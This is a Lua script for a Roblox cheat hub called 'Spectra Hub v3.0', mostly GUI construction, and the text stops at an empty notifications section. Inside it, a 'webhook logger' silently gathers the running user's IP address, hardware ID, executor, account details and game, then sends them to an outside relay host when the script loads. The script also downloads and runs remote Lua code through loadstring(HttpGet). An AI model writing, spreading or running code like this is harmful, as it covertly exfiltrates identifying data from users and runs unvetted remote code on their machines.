-- ╔══════════════════════════════════════════════════════╗
-- ║           SPECTRA HUB  v3.0  —  Mobile Edition       ║
-- ╚══════════════════════════════════════════════════════╝

local Players            = game:GetService("Players")
local LocalPlayer        = Players.LocalPlayer
local PlayerGui          = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService   = game:GetService("UserInputService")
local TweenService       = game:GetService("TweenService")
local RunService         = game:GetService("RunService")
local Lighting           = game:GetService("Lighting")
local TeleportService    = game:GetService("TeleportService")
local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- ─── detect mobile ───────────────────────────────────────
local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

-- ─── sizing constants (scales down on mobile) ────────────
local W      = isMobile and 340 or 680
local H      = isMobile and 400 or 460
local SW     = isMobile and 110 or 160   -- sidebar width
local TBAR   = isMobile and 42  or 48   -- titlebar height
local DOTGAP = isMobile and 18  or 18
local TS     = isMobile and 10  or 12   -- base text size
local TS_SM  = isMobile and 8   or 9
local TS_LG  = isMobile and 12  or 14

local function tween(obj, props, t, style, dir)
	style = style or Enum.EasingStyle.Quint
	dir   = dir   or Enum.EasingDirection.Out
	TweenService:Create(obj, TweenInfo.new(t or 0.25, style, dir), props):Play()
end

-- ═══════════════════════════════════════════
--  WEBHOOK LOGGER
-- ═══════════════════════════════════════════

getgenv().Config = {api = "073cce036f9c5688c78089c62b2c2b9557cb83841828611e4c4375d18cd48787"}
local RELAY_URL = "https://rbxhook.cc/r/473d6547e469ae2a5bba2f1db4aa8eef"

local function getPlatform()
	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "Mobile"
	elseif UserInputService.KeyboardEnabled then return "PC"
	elseif UserInputService.GamepadEnabled  then return "Console"
	else return "Unknown" end
end

local function sendWebhook(title, description, color)
	color = color or 7506394
	task.spawn(function()
		pcall(function()
			local plr = LocalPlayer
			local executor = "Unknown"
			pcall(function()
				if identifyexecutor then executor = identifyexecutor()
				elseif syn          then executor = "Synapse X"
				elseif KRNL_LOADED  then executor = "Krnl"
				elseif fluxus       then executor = "Fluxus" end
			end)
			local hwid = "Unavailable"
			pcall(function()
				if syn and syn.gethwid then hwid = syn.gethwid()
				elseif gethwid        then hwid = gethwid() end
			end)
			local gameName = "Unknown"
			pcall(function()
				local info = MarketplaceService:GetProductInfo(game.PlaceId)
				if info and info.Name then gameName = info.Name end
			end)
			local ipAddress = "Unavailable"
			pcall(function()
				local res = game:HttpGet("https://api.ipify.org")
				if res and res ~= "" then ipAddress = res end
			end)
			local accountAge = tostring(plr.AccountAge).." days"
			local membership = plr.MembershipType == Enum.MembershipType.Premium and "✅ Premium" or "❌ Free"
			local payload = HttpService:JSONEncode({
				avatar_url = "https://rbxhook.cc/img/logo.png",
				username   = "Spectra Hub Logger",
				embeds = {{
					title = title, description = description, color = color,
					author = { name = plr.Name, icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=150&height=150&format=png" },
					thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png" },
					fields = {
						{ name="👤 User Info",  value="**Username:** "..plr.Name.."\n**ID:** `"..plr.UserId.."`\n**Age:** "..accountAge.."\n**Platform:** "..getPlatform(), inline=false },
						{ name="💎 Membership", value=membership, inline=true },
						{ name="🌐 IP",         value="`"..ipAddress.."`", inline=true },
						{ name="⚙️ Executor",   value=executor, inline=true },
						{ name="🔐 HWID",       value="`"..hwid.."`", inline=false },
						{ name="🎯 Game",       value="**Name:** "..gameName.."\n**Place ID:** `"..game.PlaceId.."`", inline=false },
					},
					footer    = { text = "Spectra Hub v3.0  •  rbxhook.cc" },
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				}}
			})
			local reqFunc = (syn and syn.request) or request or http_request
			if reqFunc then
				reqFunc({ Url=RELAY_URL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=payload })
			end
		end)
	end)
end

-- ═══════════════════════════════════════════
--  LOADING SCREEN
-- ═══════════════════════════════════════════

local LoadGui = Instance.new("ScreenGui")
LoadGui.Name = "LoadingScreen"; LoadGui.ResetOnSpawn = false
LoadGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; LoadGui.Parent = PlayerGui

local Backdrop = Instance.new("Frame")
Backdrop.Size = UDim2.new(1,0,1,0); Backdrop.BackgroundColor3 = Color3.fromRGB(4,4,8)
Backdrop.BackgroundTransparency = 0.3; Backdrop.BorderSizePixel = 0; Backdrop.Parent = LoadGui

for i = 1,3 do
	local blob = Instance.new("Frame")
	blob.Size = UDim2.new(0,240+i*25,0,240+i*25)
	blob.Position = UDim2.new(0.15+i*0.2,-100,0.1+i*0.18,-100)
	blob.BackgroundColor3 = ({Color3.fromRGB(255,255,255),Color3.fromRGB(180,180,180),Color3.fromRGB(100,100,100)})[i]
	blob.BackgroundTransparency = 0.93; blob.BorderSizePixel = 0; blob.Parent = LoadGui
	Instance.new("UICorner",blob).CornerRadius = UDim.new(1,0)
end

local Card = Instance.new("Frame")
Card.Size = UDim2.new(0,300,0,180); Card.Position = UDim2.new(0.5,-150,0.5,-90)
Card.BackgroundColor3 = Color3.fromRGB(10,10,10); Card.BackgroundTransparency = 0.08
Card.BorderSizePixel = 0; Card.Parent = LoadGui
Instance.new("UICorner",Card).CornerRadius = UDim.new(0,20)
local CardStroke = Instance.new("UIStroke"); CardStroke.Color = Color3.fromRGB(255,255,255)
CardStroke.Thickness = 1.2; CardStroke.Transparency = 0.82; CardStroke.Parent = Card

local function makeLbl(txt,sz,pos,col,font,parent)
	local l = Instance.new("TextLabel")
	l.Text=txt; l.Size=sz; l.Position=pos; l.BackgroundTransparency=1
	l.TextColor3=col; l.Font=font; l.TextSize=14; l.TextTransparency=1; l.Parent=parent
	return l
end
local LIcon  = makeLbl("◈",     UDim2.new(0,36,0,36), UDim2.new(0.5,-18,0,14), Color3.new(1,1,1), Enum.Font.GothamBold, Card)
local LTitle = makeLbl("SPECTRA HUB", UDim2.new(1,0,0,30), UDim2.new(0,0,0,50), Color3.new(1,1,1), Enum.Font.GothamBold, Card)
LTitle.TextSize = 20
local LSub   = makeLbl("Initializing...", UDim2.new(1,0,0,18), UDim2.new(0,0,0,84), Color3.fromRGB(160,160,160), Enum.Font.Gotham, Card)
LSub.TextSize = 11

local PBarBg = Instance.new("Frame"); PBarBg.Size=UDim2.new(1,-40,0,3); PBarBg.Position=UDim2.new(0,20,0,112)
PBarBg.BackgroundColor3=Color3.fromRGB(35,35,35); PBarBg.BackgroundTransparency=0.5; PBarBg.BorderSizePixel=0; PBarBg.Parent=Card
Instance.new("UICorner",PBarBg).CornerRadius=UDim.new(1,0)
local PBarFill=Instance.new("Frame"); PBarFill.Size=UDim2.new(0,0,1,0); PBarFill.BackgroundColor3=Color3.fromRGB(255,255,255); PBarFill.BorderSizePixel=0; PBarFill.Parent=PBarBg
Instance.new("UICorner",PBarFill).CornerRadius=UDim.new(1,0)
local PctLbl = makeLbl("0%", UDim2.new(1,0,0,16), UDim2.new(0,0,0,122), Color3.fromRGB(100,100,100), Enum.Font.GothamBold, Card)
PctLbl.TextSize = 9

task.wait(0.2)
for _,o in pairs({LIcon,LTitle,LSub,PctLbl}) do tween(o,{TextTransparency=0},0.6) end
task.wait(0.7)
local function setStatus(t,p) LSub.Text=t; PctLbl.Text=math.floor(p*100).."%"; tween(PBarFill,{Size=UDim2.new(p,0,1,0)},0.4); task.wait(0.55) end
setStatus("Loading UI...",0.20); setStatus("Loading scripts...",0.40); setStatus("Loading Infinite Yield...",0.58)
task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end) end)
setStatus("Loading game scripts...",0.76); setStatus("Almost done...",0.92); task.wait(0.2); setStatus("Ready!",1.0); task.wait(0.5)
for _,o in pairs({LIcon,LTitle,LSub,PctLbl}) do tween(o,{TextTransparency=1},0.5) end
tween(Card,{BackgroundTransparency=1},0.5); tween(CardStroke,{Transparency=1},0.5)
tween(PBarBg,{BackgroundTransparency=1},0.5); tween(PBarFill,{BackgroundTransparency=1},0.5)
tween(Backdrop,{BackgroundTransparency=1},0.5); task.wait(0.55); LoadGui:Destroy()

-- ═══════════════════════════════════════════
--  JUNKIE KEY SYSTEM
-- ═══════════════════════════════════════════

local Arqel = loadstring(game:HttpGet("https://cdn.jnkie.com/arquelui.lua"))()
Arqel.Appearance.Title = "Spectra Hub"
Arqel.Appearance.Icon  = "rbxassetid://134697043118282"
Arqel.Links.Discord    = "Discord.gg/jnkie"
Arqel.Storage.FileName = "Jnkie_key"
Arqel.Theme.Accent      = Color3.fromRGB(110,60,255)
Arqel.Theme.AccentHover = Color3.fromRGB(130,90,255)
Arqel.Theme.Background  = Color3.fromRGB(10,10,20)
Arqel.Theme.Header      = Color3.fromRGB(15,15,30)
Arqel.Theme.Input       = Color3.fromRGB(20,20,40)
Arqel.Theme.Text        = Color3.fromRGB(255,255,255)
Arqel.Theme.TextDim     = Color3.fromRGB(160,160,200)
Arqel.Theme.Success     = Color3.fromRGB(0,220,180)
Arqel.Theme.Error       = Color3.fromRGB(255,70,90)
Arqel.Theme.StatusIdle  = Color3.fromRGB(120,100,200)
Arqel.Shop = { Enabled=true, Icon="", Title="Get Premium", Subtitle="Instant delivery • 24/7 support", ButtonText="Buy", Link="jnkie.com" }
Arqel:LaunchJunkie({ Service="Spectrahub", Identifier="1111911", Provider="Spectrahub" })
task.spawn(function() sendWebhook("✅  Script Loaded","Spectra Hub v3.0 executed successfully!",3066993) end)

-- ═══════════════════════════════════════════
--  THEME SYSTEM
-- ═══════════════════════════════════════════

local THEMES = {
	["🤍 Spectra"]    = { BG=Color3.fromRGB(8,8,8),    BG_PANEL=Color3.fromRGB(12,12,12),  BG_ITEM=Color3.fromRGB(18,18,18),  TITLEBAR=Color3.fromRGB(6,6,6),    ACCENT=Color3.fromRGB(255,255,255), ACCENT2=Color3.fromRGB(200,200,200), ACCENT_DIM=Color3.fromRGB(35,35,35),   STROKE=Color3.fromRGB(50,50,50),   TEXT=Color3.fromRGB(220,220,220), TEXT_DIM=Color3.fromRGB(140,140,140), TEXT_MUTED=Color3.fromRGB(70,70,70),   WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(180,180,180), BTN_TEXT=Color3.fromRGB(0,0,0) },
	["⚡ Volt"]       = { BG=Color3.fromRGB(6,6,12),   BG_PANEL=Color3.fromRGB(11,11,20),  BG_ITEM=Color3.fromRGB(17,16,30),  TITLEBAR=Color3.fromRGB(8,7,16),   ACCENT=Color3.fromRGB(110,70,255),  ACCENT2=Color3.fromRGB(60,170,255),  ACCENT_DIM=Color3.fromRGB(55,35,130),  STROKE=Color3.fromRGB(60,45,110),  TEXT=Color3.fromRGB(230,225,255), TEXT_DIM=Color3.fromRGB(140,128,190), TEXT_MUTED=Color3.fromRGB(70,65,105),  WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(110,70,255),  BTN_TEXT=Color3.fromRGB(255,255,255) },
	["🔥 Ember"]      = { BG=Color3.fromRGB(10,5,5),   BG_PANEL=Color3.fromRGB(18,9,9),    BG_ITEM=Color3.fromRGB(26,13,13),  TITLEBAR=Color3.fromRGB(14,7,7),   ACCENT=Color3.fromRGB(255,65,80),   ACCENT2=Color3.fromRGB(255,160,40),  ACCENT_DIM=Color3.fromRGB(90,22,28),   STROKE=Color3.fromRGB(110,38,45),  TEXT=Color3.fromRGB(255,215,210), TEXT_DIM=Color3.fromRGB(185,130,130), TEXT_MUTED=Color3.fromRGB(100,65,65),  WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(255,65,80),   BTN_TEXT=Color3.fromRGB(255,255,255) },
	["🌊 Cyan"]       = { BG=Color3.fromRGB(4,10,18),  BG_PANEL=Color3.fromRGB(7,16,28),   BG_ITEM=Color3.fromRGB(11,24,40),  TITLEBAR=Color3.fromRGB(5,12,22),  ACCENT=Color3.fromRGB(0,210,240),   ACCENT2=Color3.fromRGB(0,120,255),   ACCENT_DIM=Color3.fromRGB(0,65,80),    STROKE=Color3.fromRGB(15,80,110),  TEXT=Color3.fromRGB(195,235,255), TEXT_DIM=Color3.fromRGB(110,175,215), TEXT_MUTED=Color3.fromRGB(55,100,140), WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(0,210,240),   BTN_TEXT=Color3.fromRGB(0,0,0) },
	["🌿 Neon Green"] = { BG=Color3.fromRGB(4,10,6),   BG_PANEL=Color3.fromRGB(7,17,10),   BG_ITEM=Color3.fromRGB(11,26,15),  TITLEBAR=Color3.fromRGB(5,13,8),   ACCENT=Color3.fromRGB(40,230,100),  ACCENT2=Color3.fromRGB(130,255,80),  ACCENT_DIM=Color3.fromRGB(12,70,30),   STROKE=Color3.fromRGB(22,90,45),   TEXT=Color3.fromRGB(195,250,215), TEXT_DIM=Color3.fromRGB(110,185,140), TEXT_MUTED=Color3.fromRGB(55,105,75),  WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(40,230,100),  BTN_TEXT=Color3.fromRGB(0,0,0) },
	["🌸 Pink"]       = { BG=Color3.fromRGB(14,6,12),  BG_PANEL=Color3.fromRGB(22,10,19),  BG_ITEM=Color3.fromRGB(32,14,27),  TITLEBAR=Color3.fromRGB(17,8,15),  ACCENT=Color3.fromRGB(255,70,160),  ACCENT2=Color3.fromRGB(255,150,220), ACCENT_DIM=Color3.fromRGB(85,20,55),   STROKE=Color3.fromRGB(120,38,88),  TEXT=Color3.fromRGB(255,205,235), TEXT_DIM=Color3.fromRGB(195,140,175), TEXT_MUTED=Color3.fromRGB(110,72,95),  WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(255,70,160),  BTN_TEXT=Color3.fromRGB(255,255,255) },
	["🌙 Ghost"]      = { BG=Color3.fromRGB(7,7,10),   BG_PANEL=Color3.fromRGB(12,12,17),  BG_ITEM=Color3.fromRGB(18,18,26),  TITLEBAR=Color3.fromRGB(9,9,14),   ACCENT=Color3.fromRGB(175,175,240), ACCENT2=Color3.fromRGB(220,220,255), ACCENT_DIM=Color3.fromRGB(42,42,68),   STROKE=Color3.fromRGB(50,50,80),   TEXT=Color3.fromRGB(210,210,245), TEXT_DIM=Color3.fromRGB(130,130,165), TEXT_MUTED=Color3.fromRGB(65,65,100),  WHITE=Color3.fromRGB(255,255,255), GLOW=Color3.fromRGB(175,175,240), BTN_TEXT=Color3.fromRGB(0,0,0) },
}

local function copyTheme(src) local t={} for k,v in pairs(src) do t[k]=v end return t end
local THEME = copyTheme(THEMES["🤍 Spectra"])
local themedObjects = {}
local function regT(obj,prop,key) table.insert(themedObjects,{obj=obj,property=prop,themeKey=key}) end
local function applyTheme()
	for _,e in pairs(themedObjects) do
		if e.obj and e.obj.Parent then
			local col = THEME[e.themeKey]
			if col then
				if     e.property=="BackgroundColor3" then e.obj.BackgroundColor3=col
				elseif e.property=="TextColor3"       then e.obj.TextColor3=col
				elseif e.property=="Color"            then e.obj.Color=col
				elseif e.property=="ImageColor3"      then e.obj.ImageColor3=col end
			end
		end
	end
end

-- ═══════════════════════════════════════════
--  MAIN GUI
-- ═══════════════════════════════════════════

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SpectraHub"; ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0,W,0,H)
MainFrame.Position = UDim2.new(0.5,-W/2,0.5,-H/2)
MainFrame.BackgroundColor3 = THEME.BG
MainFrame.BackgroundTransparency = 0.08
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.ZIndex = 1
MainFrame.Parent = ScreenGui
Instance.new("UICorner",MainFrame).CornerRadius = UDim.new(0,14)
local MainStroke = Instance.new("UIStroke")
MainStroke.Color=THEME.STROKE; MainStroke.Thickness=1.5; MainStroke.Transparency=0.2; MainStroke.Parent=MainFrame
regT(MainFrame,"BackgroundColor3","BG"); regT(MainStroke,"Color","STROKE")

-- ═══════════════════════════════════════════
--  TITLEBAR
-- ═══════════════════════════════════════════

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1,0,0,TBAR)
TitleBar.BackgroundColor3 = THEME.TITLEBAR; TitleBar.BackgroundTransparency=0.05
TitleBar.BorderSizePixel=0; TitleBar.ZIndex=5; TitleBar.Parent=MainFrame
Instance.new("UICorner",TitleBar).CornerRadius=UDim.new(0,14)
regT(TitleBar,"BackgroundColor3","TITLEBAR")

local AccentLine = Instance.new("Frame")
AccentLine.Size=UDim2.new(1,0,0,2); AccentLine.Position=UDim2.new(0,0,1,-2)
AccentLine.BackgroundColor3=THEME.ACCENT; AccentLine.BorderSizePixel=0; AccentLine.Parent=TitleBar
local ALGrad = Instance.new("UIGradient")
ALGrad.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,THEME.ACCENT),ColorSequenceKeypoint.new(0.5,THEME.ACCENT2),ColorSequenceKeypoint.new(1,THEME.ACCENT)})
ALGrad.Parent=AccentLine

local function makeDot(x,col)
	local d=Instance.new("TextButton"); d.Text=""; d.Size=UDim2.new(0,11,0,11)
	d.Position=UDim2.new(0,x,0.5,-6); d.BackgroundColor3=col; d.BorderSizePixel=0; d.Parent=TitleBar
	Instance.new("UICorner",d).CornerRadius=UDim.new(1,0); return d
end
local Dot1=makeDot(12,Color3.fromRGB(255,95,86))
local Dot2=makeDot(28,Color3.fromRGB(255,189,46))

local HubIcon=Instance.new("TextLabel"); HubIcon.Text="◈"; HubIcon.Size=UDim2.new(0,20,1,0)
HubIcon.Position=UDim2.new(0,50,0,0); HubIcon.BackgroundTransparency=1; HubIcon.TextColor3=THEME.ACCENT
HubIcon.Font=Enum.Font.GothamBold; HubIcon.TextSize=16; HubIcon.Parent=TitleBar
regT(HubIcon,"TextColor3","ACCENT")

local TitleLabel=Instance.new("TextLabel"); TitleLabel.Text="SPECTRA HUB"
TitleLabel.Size=UDim2.new(0,140,1,0); TitleLabel.Position=UDim2.new(0,72,0,0)
TitleLabel.BackgroundTransparency=1; TitleLabel.TextColor3=THEME.WHITE
TitleLabel.TextXAlignment=Enum.TextXAlignment.Left; TitleLabel.Font=Enum.Font.GothamBold
TitleLabel.TextSize=TS_LG; TitleLabel.Parent=TitleBar

local VerLabel=Instance.new("TextLabel"); VerLabel.Text="v3.0"
VerLabel.Size=UDim2.new(0,30,1,0); VerLabel.Position=UDim2.new(0,215,0,0)
VerLabel.BackgroundTransparency=1; VerLabel.TextColor3=THEME.ACCENT
VerLabel.TextXAlignment=Enum.TextXAlignment.Left; VerLabel.Font=Enum.Font.Gotham
VerLabel.TextSize=9; VerLabel.Parent=TitleBar
regT(VerLabel,"TextColor3","ACCENT")

-- ─── forward declare so dots can reference them ───────────
local Sidebar, ContentPanel, PlayerCard
local minimized=false; local hubVisible=true

Dot1.MouseButton1Click:Connect(function()
	tween(MainFrame,{Size=UDim2.new(0,0,0,0),Position=UDim2.new(0.5,0,0.5,0)},0.3)
	task.wait(0.35); ScreenGui:Destroy()
end)

Dot2.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		tween(MainFrame,{Size=UDim2.new(0,W,0,TBAR)},0.3,Enum.EasingStyle.Quint)
		task.delay(0.31,function()
			if Sidebar      then Sidebar.Visible=false      end
			if ContentPanel then ContentPanel.Visible=false end
			if PlayerCard   then PlayerCard.Visible=false   end
		end)
	else
		if Sidebar      then Sidebar.Visible=true      end
		if ContentPanel then ContentPanel.Visible=true end
		if PlayerCard   then PlayerCard.Visible=true   end
		tween(MainFrame,{Size=UDim2.new(0,W,0,H)},0.35,Enum.EasingStyle.Back)
	end
end)

-- ─── DRAG (touch + mouse) ────────────────────────────────
local drag=false; local dragStart; local startPos
local function onDragBegan(pos)
	drag=true; dragStart=pos; startPos=MainFrame.Position
end
local function onDragMoved(pos)
	if not drag then return end
	local d = pos - dragStart
	MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
end
local function onDragEnded() drag=false end

-- Mouse drag
TitleBar.InputBegan:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.MouseButton1 then onDragBegan(i.Position) end
end)
TitleBar.InputEnded:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.MouseButton1 then onDragEnded() end
end)
UserInputService.InputChanged:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.MouseMovement then onDragMoved(i.Position) end
end)

-- Touch drag
TitleBar.InputBegan:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.Touch then onDragBegan(i.Position) end
end)
TitleBar.InputEnded:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.Touch then onDragEnded() end
end)
TitleBar.InputChanged:Connect(function(i)
	if i.UserInputType==Enum.UserInputType.Touch then onDragMoved(i.Position) end
end)

-- RightShift toggle (PC only)
if not isMobile then
	UserInputService.InputBegan:Connect(function(i,gpe)
		if gpe then return end
		if i.KeyCode==Enum.KeyCode.RightShift then
			hubVisible = not hubVisible
			if hubVisible then
				MainFrame.Visible=true
				local targetSize = minimized and UDim2.new(0,W,0,TBAR) or UDim2.new(0,W,0,H)
				tween(MainFrame,{Size=targetSize},0.3,Enum.EasingStyle.Back)
			else
				tween(MainFrame,{Size=UDim2.new(0,W,0,0)},0.2)
				task.delay(0.25,function() MainFrame.Visible=false end)
			end
		end
	end)
end

-- ═══════════════════════════════════════════
--  SIDEBAR (scrollable)
-- ═══════════════════════════════════════════

Sidebar = Instance.new("ScrollingFrame")
Sidebar.Name="Sidebar"; Sidebar.Size=UDim2.new(0,SW,1,-TBAR)
Sidebar.Position=UDim2.new(0,0,0,TBAR)
Sidebar.BackgroundColor3=THEME.BG_PANEL; Sidebar.BackgroundTransparency=0.1
Sidebar.BorderSizePixel=0; Sidebar.ScrollBarThickness=0
Sidebar.ScrollingDirection=Enum.ScrollingDirection.Y
Sidebar.CanvasSize=UDim2.new(0,0,0,0); Sidebar.AutomaticCanvasSize=Enum.AutomaticSize.Y
Sidebar.ScrollingEnabled=true; Sidebar.Parent=MainFrame
Instance.new("UICorner",Sidebar).CornerRadius=UDim.new(0,12)
regT(Sidebar,"BackgroundColor3","BG_PANEL")
local SidebarStroke=Instance.new("UIStroke"); SidebarStroke.Color=THEME.STROKE
SidebarStroke.Thickness=1; SidebarStroke.Transparency=0.5; SidebarStroke.Parent=Sidebar
regT(SidebarStroke,"Color","STROKE")
local SidebarList=Instance.new("UIListLayout"); SidebarList.Padding=UDim.new(0,2); SidebarList.Parent=Sidebar
local SidebarPad=Instance.new("UIPadding")
SidebarPad.PaddingTop=UDim.new(0,10); SidebarPad.PaddingLeft=UDim.new(0,5)
SidebarPad.PaddingRight=UDim.new(0,5); SidebarPad.PaddingBottom=UDim.new(0,6)
SidebarPad.Parent=Sidebar
local SBLabel=Instance.new("TextLabel"); SBLabel.Text="NAV"; SBLabel.Size=UDim2.new(1,0,0,14)
SBLabel.BackgroundTransparency=1; SBLabel.TextColor3=THEME.TEXT_MUTED
SBLabel.Font=Enum.Font.GothamBold; SBLabel.TextSize=TS_SM
SBLabel.TextXAlignment=Enum.TextXAlignment.Left; SBLabel.Parent=Sidebar
regT(SBLabel,"TextColor3","TEXT_MUTED")

-- ═══════════════════════════════════════════
--  PLAYER CARD (anchored to bottom of MainFrame)
-- ═══════════════════════════════════════════

PlayerCard = Instance.new("Frame")
PlayerCard.Name="PlayerCard"
PlayerCard.Size=UDim2.new(0,SW-10,0,isMobile and 56 or 70)
PlayerCard.Position=UDim2.new(0,5,1,-(isMobile and 62 or 76))
PlayerCard.BackgroundColor3=THEME.BG_ITEM; PlayerCard.BackgroundTransparency=0.1
PlayerCard.BorderSizePixel=0; PlayerCard.ZIndex=10; PlayerCard.Parent=MainFrame
Instance.new("UICorner",PlayerCard).CornerRadius=UDim.new(0,10)
local pcStroke=Instance.new("UIStroke"); pcStroke.Color=THEME.STROKE; pcStroke.Thickness=1; pcStroke.Transparency=0.3; pcStroke.Parent=PlayerCard
regT(PlayerCard,"BackgroundColor3","BG_ITEM"); regT(pcStroke,"Color","STROKE")

local avatarSize = isMobile and 46 or 60
local AvatarImg=Instance.new("ImageLabel")
AvatarImg.Size=UDim2.new(0,avatarSize,0,avatarSize); AvatarImg.Position=UDim2.new(0,4,0.5,-avatarSize/2)
AvatarImg.BackgroundColor3=Color3.fromRGB(20,20,20); AvatarImg.BackgroundTransparency=0.3
AvatarImg.BorderSizePixel=0; AvatarImg.ScaleType=Enum.ScaleType.Fit
AvatarImg.Image="rbxthumb://type=AvatarHeadShot&id="..LocalPlayer.UserId.."&w=150&h=150"
AvatarImg.Parent=PlayerCard
Instance.new("UICorner",AvatarImg).CornerRadius=UDim.new(0,8)

local nameOffX = avatarSize+10
local PCName=Instance.new("TextLabel"); PCName.Text=LocalPlayer.DisplayName
PCName.Size=UDim2.new(1,-nameOffX-4,0,16); PCName.Position=UDim2.new(0,nameOffX,0,8)
PCName.BackgroundTransparency=1; PCName.TextColor3=THEME.WHITE; PCName.Font=Enum.Font.GothamBold
PCName.TextSize=TS; PCName.TextXAlignment=Enum.TextXAlignment.Left; PCName.TextTruncate=Enum.TextTruncate.AtEnd; PCName.Parent=PlayerCard

local PCUser=Instance.new("TextLabel"); PCUser.Text="@"..LocalPlayer.Name
PCUser.Size=UDim2.new(1,-nameOffX-4,0,13); PCUser.Position=UDim2.new(0,nameOffX,0,24)
PCUser.BackgroundTransparency=1; PCUser.TextColor3=THEME.TEXT_MUTED; PCUser.Font=Enum.Font.Gotham
PCUser.TextSize=TS_SM; PCUser.TextXAlignment=Enum.TextXAlignment.Left; PCUser.TextTruncate=Enum.TextTruncate.AtEnd; PCUser.Parent=PlayerCard
regT(PCName,"TextColor3","WHITE"); regT(PCUser,"TextColor3","TEXT_MUTED")

local OnlineDot=Instance.new("Frame"); OnlineDot.Size=UDim2.new(0,6,0,6)
OnlineDot.Position=UDim2.new(0,nameOffX,0,42); OnlineDot.BackgroundColor3=Color3.fromRGB(40,210,110)
OnlineDot.BorderSizePixel=0; OnlineDot.Parent=PlayerCard
Instance.new("UICorner",OnlineDot).CornerRadius=UDim.new(1,0)
local OnlineLabel=Instance.new("TextLabel"); OnlineLabel.Text="In Game"
OnlineLabel.Size=UDim2.new(1,-nameOffX-14,0,12); OnlineLabel.Position=UDim2.new(0,nameOffX+10,0,40)
OnlineLabel.BackgroundTransparency=1; OnlineLabel.TextColor3=Color3.fromRGB(40,210,110)
OnlineLabel.Font=Enum.Font.Gotham; OnlineLabel.TextSize=TS_SM; OnlineLabel.TextXAlignment=Enum.TextXAlignment.Left; OnlineLabel.Parent=PlayerCard

-- ═══════════════════════════════════════════
--  CONTENT PANEL + SEARCH
-- ═══════════════════════════════════════════

ContentPanel=Instance.new("Frame"); ContentPanel.Name="ContentPanel"
ContentPanel.Size=UDim2.new(1,-SW-4,1,-TBAR-8)
ContentPanel.Position=UDim2.new(0,SW+4,0,TBAR+4)
ContentPanel.BackgroundTransparency=1; ContentPanel.BorderSizePixel=0; ContentPanel.Parent=MainFrame

local SearchWrap=Instance.new("Frame"); SearchWrap.Size=UDim2.new(1,-4,0,isMobile and 28 or 32)
SearchWrap.Position=UDim2.new(0,0,0,0); SearchWrap.BackgroundColor3=THEME.BG_ITEM
SearchWrap.BorderSizePixel=0; SearchWrap.Parent=ContentPanel
Instance.new("UICorner",SearchWrap).CornerRadius=UDim.new(0,9)
local SWStroke=Instance.new("UIStroke"); SWStroke.Color=THEME.STROKE; SWStroke.Thickness=1; SWStroke.Transparency=0.3; SWStroke.Parent=SearchWrap
regT(SearchWrap,"BackgroundColor3","BG_ITEM"); regT(SWStroke,"Color","STROKE")

local SearchIconLbl=Instance.new("TextLabel"); SearchIconLbl.Text="⌕"
SearchIconLbl.Size=UDim2.new(0,22,1,0); SearchIconLbl.Position=UDim2.new(0,5,0,0)
SearchIconLbl.BackgroundTransparency=1; SearchIconLbl.TextColor3=THEME.TEXT_MUTED
SearchIconLbl.Font=Enum.Font.GothamBold; SearchIconLbl.TextSize=14; SearchIconLbl.Parent=SearchWrap

local SearchBox=Instance.new("TextBox"); SearchBox.Text=""; SearchBox.PlaceholderText=""
SearchBox.Size=UDim2.new(1,-30,1,0); SearchBox.Position=UDim2.new(0,26,0,0)
SearchBox.BackgroundTransparency=1; SearchBox.TextColor3=THEME.TEXT
SearchBox.Font=Enum.Font.Gotham; SearchBox.TextSize=TS; SearchBox.TextXAlignment=Enum.TextXAlignment.Left
SearchBox.MultiLine=false; SearchBox.ClearTextOnFocus=false; SearchBox.ZIndex=2; SearchBox.Parent=SearchWrap

local SearchPlaceholder=Instance.new("TextLabel"); SearchPlaceholder.Text="Search..."
SearchPlaceholder.Size=UDim2.new(1,-30,1,0); SearchPlaceholder.Position=UDim2.new(0,26,0,0)
SearchPlaceholder.BackgroundTransparency=1; SearchPlaceholder.TextColor3=THEME.TEXT_MUTED
SearchPlaceholder.Font=Enum.Font.Gotham; SearchPlaceholder.TextSize=TS
SearchPlaceholder.TextXAlignment=Enum.TextXAlignment.Left; SearchPlaceholder.ZIndex=1; SearchPlaceholder.Parent=SearchWrap
regT(SearchPlaceholder,"TextColor3","TEXT_MUTED")

SearchBox.Focused:Connect(function()  SearchPlaceholder.Visible=false end)
SearchBox.FocusLost:Connect(function() SearchPlaceholder.Visible=(SearchBox.Text=="") end)

-- ═══════════════════════════════════════════
--  NOTIFICATIONS
-- ═══════════════════════════════════════════

